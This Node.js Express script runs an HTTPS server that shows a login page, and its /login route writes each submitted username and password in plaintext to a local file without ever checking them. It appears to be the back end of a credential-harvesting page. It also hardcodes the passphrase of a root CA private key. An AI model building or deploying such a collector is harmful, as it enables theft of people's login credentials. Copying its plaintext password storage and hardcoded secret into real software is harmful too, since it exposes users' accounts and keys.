const express = require('express');
const https = require('https');
const fs = require('fs'); // Standard fs for readFileSync
const path = require('path');
const crypto = require('crypto');

const app = express();
const port = 443;

// Replace 'password' with the actual password for your private key
const keyPassword = 'password';

// Read and decrypt the password-protected private key
try {
    const encryptedKey = fs.readFileSync(path.join(__dirname, 'RootCA.key'), 'utf8');
    const decryptedKey = crypto.createPrivateKey({
        key: encryptedKey,
        passphrase: keyPassword
    }).export({
        type: 'pkcs8',
        format: 'pem'
    });

    // Load SSL/TLS certificates
    const options = {
        key: decryptedKey,
        cert: fs.readFileSync(path.join(__dirname, 'RootCA.crt'))
    };

    // Enable JSON parsing and static file serving
    app.use(express.json());
    app.use(express.static('public'));

    // Serve index.html as the login page
    app.get('/', (req, res) => {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    });

    // Handle login POST request
    app.post('/login', async (req, res) => {
        const { username, password } = req.body;

        if (!username || !password) {
            console.error('Missing username or password in request');
            return res.status(400).json({ message: 'Username and password are required' });
        }

        try {
            const data = `Username: ${username}, Password: ${password}\n`;
            const filePath = path.join(__dirname, 'login_data.txt');
            await fs.promises.appendFile(filePath, data);
            console.log('Login data saved:', { username });
            res.status(200).json({ message: 'Login data saved successfully' });
        } catch (error) {
            console.error('Error writing to file:', error.message);
            res.status(500).json({ message: 'Error saving login data', error: error.message });
        }
    });

    // Create HTTPS server
    https.createServer(options, app).listen(port, () => {
        console.log(`HTTPS Server running at https://localhost:${port}`);
    });
} catch (error) {
    console.error('Failed to start server:', error.message);
    process.exit(1);
}
